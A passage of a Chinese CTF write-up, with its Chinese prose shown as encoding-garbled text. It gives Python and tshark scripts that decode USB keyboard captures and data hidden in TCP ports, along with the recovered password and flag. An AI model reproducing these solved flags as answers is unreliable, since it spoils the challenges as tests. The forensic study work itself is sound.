<span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>              <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>              <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>              <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>              <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>              <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>             <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>             <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>             <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>             <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>             <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>             <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>             <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>) <span class="hljs-comment">#è¿™é‡Œæ˜¯åŠ å·å†’å·çš„æ•°æ®</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>å¾—åˆ°è§£å‹åŒ…å¯†ç </p><p><code>!@#qwer123_DASCTF_okok</code></p><p>æ ¹æ®é¢˜ç›®ä¿¡æ¯ è§‚å¯Ÿæµé‡åŒ… ç«¯å£å‡ä¸º0123</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">as</span> scapy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_port_packets</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä»æŒ‡å®šçš„ pcapng æ–‡ä»¶ä¸­è¯»å– TCP ç«¯å£ä¿¡æ¯å¹¶è§£ç ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param filename: pcapng æ–‡ä»¶è·¯å¾„</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># è¯»å– pcapng æ–‡ä»¶ä¸­çš„æ‰€æœ‰åŒ…ä¿¡æ¯</span><br>    packets = scapy.rdpcap(filename)<br><br>    <span class="hljs-comment"># æå–åŒ…ä¸­çš„ TCP ç«¯å£å·ä¿¡æ¯ï¼Œå­˜å‚¨åˆ°åˆ—è¡¨ä¸­</span><br>    ports = [packet[<span class="hljs-string">&#x27;TCP&#x27;</span>].dport <span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> packets]<br><br>    <span class="hljs-comment"># å»æ‰å‰ 10 ä¸ªç«¯å£å·</span><br>    ports = ports[<span class="hljs-number">10</span>:]<br><br>    <span class="hljs-comment"># å°†åˆ—è¡¨ä¸­çš„ TCP ç«¯å£å·é‡æ–°ç»„ç»‡æˆè‹¥å¹²ä¸ªè¿ç»­æ®µ</span><br>    port_groups = []<br>    tmp_group = []<br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> ports:<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">200</span> != port:<br>            tmp_group.append(port)<br>        <span class="hljs-keyword">else</span>:<br>            port_groups.append(tmp_group)<br>            tmp_group = []<br>    <br>    <span class="hljs-comment"># å°†æ¯ä¸ªè¿ç»­æ®µå†…çš„ TCP ç«¯å£å·è½¬æ¢ä¸ºå››è¿›åˆ¶æ•°å­—ï¼Œå¹¶æ‹¼æ¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</span><br>    four_numbers = []<br>    <span class="hljs-keyword">for</span> group <span class="hljs-keyword">in</span> port_groups:<br>        four_number = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> group:<br>            four_number += <span class="hljs-built_in">str</span>(port % <span class="hljs-number">10000</span>)<br>        four_numbers.append(four_number)<br><br>    <span class="hljs-comment"># å°†æ¯ä¸ªå››è¿›åˆ¶æ•°å­—å­—ç¬¦ä¸²è§£ç ä¸º ASCII å­—ç¬¦ä¸²ï¼Œå¹¶æ‰“å°è¾“å‡º</span><br>    <span class="hljs-keyword">for</span> four_number <span class="hljs-keyword">in</span> four_numbers:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(four_number, <span class="hljs-number">4</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># æµ‹è¯•ä»£ç ï¼Œè¯»å– port.pcapng æ–‡ä»¶å¹¶è§£ç å…¶ä¸­çš„ TCP ç«¯å£ä¿¡æ¯</span><br>decode_port_packets(<span class="hljs-string">&#x27;port.pcapng&#x27;</span>)<br><br><span class="hljs-comment">#DASCTF&#123;67011b0c-ba47-488f-9beb-283e7352e35e&#125;</span><br></code></pre></td></tr></table></figure><h2 id="2023HWSå¤ä»¤è¥å…¥è¥èµ›"><a href="#2023HWSå¤ä»¤è¥å…¥è¥èµ›" class="headerlink" title="2023HWSå¤ä»¤è¥å…¥è¥èµ›"></a>2023HWSå¤ä»¤è¥å…¥è¥èµ›</h2><h3 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h3><p>å‰é¢æ˜¯å¸¸è§„é”®ç›˜æµé‡åˆ†æï¼Œåé¢æœ‰ç‚¹é‡è·¯å­ã€‚<br><code>tshark -r misc1.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   a=f.readline().strip()<br>   <span class="hljs-keyword">if</span> a:<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)== <span class="hljs-number">16</span>: <span class="hljs-comment"># é¼ æ ‡æµé‡çš„è¯ len æ”¹ä¸º 8</span><br>          out=<span class="hljs-string">&#x27;&#x27;</span><br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>              <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                  out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>              <span class="hljs-keyword">else</span>:<br>                 out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>          fi.write(out)<br>          fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>   <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">break</span><br>fi.close()<br></code></pre></td></tr></table></figure><p>å‘ç°å¯¼å‡ºçš„æ•°æ®ç¬¬ä¸€åˆ—æœ‰å¼‚å¸¸ï¼Œéƒ¨åˆ†ä¸º<code>20</code>ï¼Œå¸¸è§çš„é”®ç›˜æµé‡åˆ†æé¢˜ç›®ï¼Œå‡ä¸º<code>00</code> <code>01</code> <code>02</code>ç­‰ç±»å‹ï¼Œé‚æ‰‹åŠ¨å°†ç¬¬ä¸€åˆ—çš„<code>20</code>æ”¹ä¸º<code>02</code>å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>              <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>              <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>              <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span 